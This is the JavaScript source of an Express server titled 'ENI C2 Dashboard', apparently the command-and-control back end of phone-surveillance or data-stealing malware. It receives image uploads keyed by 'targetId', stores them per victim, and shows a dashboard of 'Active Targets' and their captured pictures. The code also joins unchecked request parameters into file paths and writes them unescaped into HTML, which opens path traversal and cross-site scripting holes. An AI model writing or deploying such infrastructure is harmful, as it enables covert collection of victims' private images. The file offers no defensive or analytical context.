const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const app = express();
const port = process.env.PORT || 3000;

// Setup storage
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const dir = '/tmp/uploads/' + req.params.targetId;
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + '.jpg');
    }
});

const upload = multer({ storage: storage });

// Middleware
app.use(express.static('public'));

// Upload endpoint
app.post('/upload/:targetId', upload.single('file'), (req, res) => {
    console.log(`[+] Received from ${req.params.targetId}`);
    res.sendStatus(200);
});

// Simple dashboard
app.get('/', (req, res) => {
    const uploadsDir = '/tmp/uploads';
    let targets = [];
    if (fs.existsSync(uploadsDir)) {
        targets = fs.readdirSync(uploadsDir);
    }
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>ENI C2 Dashboard</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: Arial; background: #1a1a2e; color: #eee; padding: 20px; }
                h1 { color: #e94560; }
                .target { background: #16213e; padding: 15px; margin: 10px 0; border-radius: 10px; }
                a { color: #4ecca3; }
                img { max-width: 300px; margin: 10px; }
            </style>
        </head>
        <body>
            <h1>🔥 ENI C2 Dashboard</h1>
            <p>Active Targets: ${targets.length}</p>
            ${targets.map(t => `
                <div class="target">
                    <h3>📱 ${t}</h3>
                    <a href="/files/${t}">View Files</a>
                </div>
            `).join('')}
        </body>
        </html>
    `);
});

// View files
app.get('/files/:targetId', (req, res) => {
    const dir = '/tmp/uploads/' + req.params.targetId;
    if (!fs.existsSync(dir)) return res.send('No files');
    
    const files = fs.readdirSync(dir);
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Files - ${req.params.targetId}</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: Arial; background: #1a1a2e; color: #eee; padding: 20px; }
                h1 { color: #e94560; }
                img { max-width: 300px; margin: 10px; display: block; }
                .file { background: #16213e; padding: 10px; margin: 10px 0; border-radius: 10px; }
            </style>
        </head>
        <body>
            <h1>📁 Files for ${req.params.targetId}</h1>
            <a href="/" style="color: #4ecca3;">← Back to Dashboard</a>
            ${files.map(f => `
                <div class="file">
                    <p>${f}</p>
                    <img src="/image/${req.params.targetId}/${f}">
                </div>
            `).join('')}
        </body>
        </html>
    `);
});

// Serve images
app.get('/image/:targetId/:filename', (req, res) => {
    const file = '/tmp/uploads/' + req.params.targetId + '/' + req.params.filename;
    if (fs.existsSync(file)) {
        res.sendFile(file);
    } else {
        res.send('Not found');
    }
});

app.listen(port, () => {
    console.log(`[+] Server running on port ${port}`);
});
